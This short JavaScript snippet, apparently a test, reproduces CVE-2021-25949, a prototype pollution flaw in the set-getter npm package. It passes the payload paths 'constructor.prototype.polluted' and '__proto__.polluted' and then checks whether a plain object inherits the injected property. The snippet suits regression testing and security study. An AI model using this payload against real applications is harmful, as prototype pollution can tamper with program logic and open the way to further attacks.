// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25949
// test("prototype pollution in set-getter ", () => {
  var setGetter = require("set-getter");
  var obj = {};

console.log({}.polluted);

  //setGetter(obj, "__proto__.polluted", function (polluted) {
  setGetter(obj, "constructor.prototype.polluted", function (polluted) {
    return "yes";
  });
console.log({}.polluted);
// });
